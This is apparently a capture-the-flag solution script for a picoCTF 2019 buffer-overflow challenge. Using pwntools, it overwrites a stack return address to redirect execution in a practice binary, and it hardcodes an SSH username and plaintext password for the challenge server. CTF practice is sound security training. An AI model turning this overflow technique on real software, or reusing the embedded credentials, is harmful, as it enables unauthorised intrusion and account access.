from pwn import *

# Config
LOCAL = False
WRITE = True

# Setup
context.log_level = 'debug'
prob_dir = '/problems/newoverflow-1_4_3fc8f7e1553d8d36ded1be37c306f3a4/'
exe = 'vuln'
if LOCAL:
    sh = process('./' + exe)
else:
    s = ssh(host='2019shell1.picoctf.com', user='thomasvn', password='#8L7Z#Fj')
    sh = s.process(prob_dir + exe, cwd=prob_dir)

# Build exploit
cmd = b'A' * 64   # buffer
cmd += b'B' * 8   # saved ebp
cmd += p64(0x400767)  # overwrite return

# Write exploit to file
if WRITE:
    f = open('input.txt', 'wb')
    f.write(cmd)
    f.close()

# Buffer overflow
sh.sendlineafter(': ', cmd)
sh.interactive()
